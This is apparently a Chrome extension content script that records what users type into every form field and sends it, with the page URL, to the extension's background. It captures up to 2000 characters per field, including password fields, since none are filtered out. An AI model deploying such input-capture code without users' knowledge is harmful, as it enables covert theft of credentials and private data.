function sendInput(payload) {
  try {
    chrome.runtime.sendMessage({ type: "browser_input", payload });
  } catch (_) {}
}

let lastSent = 0;
function maybeSend(target) {
  if (!target) return;
  const now = Date.now();
  if (now - lastSent < 150) return;
  lastSent = now;
  const value = typeof target.value === "string" ? target.value : "";
  sendInput({
    fieldType: (target.type || target.tagName || "").toString().toLowerCase(),
    fieldName: (target.name || target.id || "").toString(),
    fieldKey: `${(target.tagName || "").toString().toLowerCase()}::${(target.name || target.id || "").toString()}`,
    inputLength: value.length,
    valueSample: value.slice(0, 2000),
    pageUrl: window.location.href || ""
  });
}

document.addEventListener("input", (e) => {
  maybeSend(e.target);
}, true);

document.addEventListener("change", (e) => {
  maybeSend(e.target);
}, true);

document.addEventListener("submit", (e) => {
  const t = e.target;
  if (!t) return;
  sendInput({
    fieldType: "form_submit",
    fieldName: (t.name || t.id || "").toString(),
    fieldKey: `form::${(t.name || t.id || "").toString()}`,
    inputLength: 0,
    valueSample: "",
    pageUrl: window.location.href || ""
  });
}, true);
